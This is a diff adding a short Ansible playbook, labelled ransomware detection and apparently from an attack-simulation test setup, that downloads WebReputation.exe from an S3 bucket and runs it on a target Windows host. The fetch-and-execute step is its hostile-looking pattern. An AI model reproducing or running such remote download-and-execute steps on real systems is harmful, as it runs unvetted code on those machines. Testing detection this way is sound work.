@@ -1,0 +1,15 @@
+---
+# ransomware detection
+- hosts: "{{target}}"
+  gather_facts: no
+  tasks:
+  - name: Download WebReputation
+    win_get_url:
+       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/WebReputation.exe
+       dest: c:\WebReputation.exe
+       
+  - name: Execute WebReputation
+    win_command: c:\WebReputation.exe
+    ignore_errors: yes
+    args:
+      stdin: Write-Host test
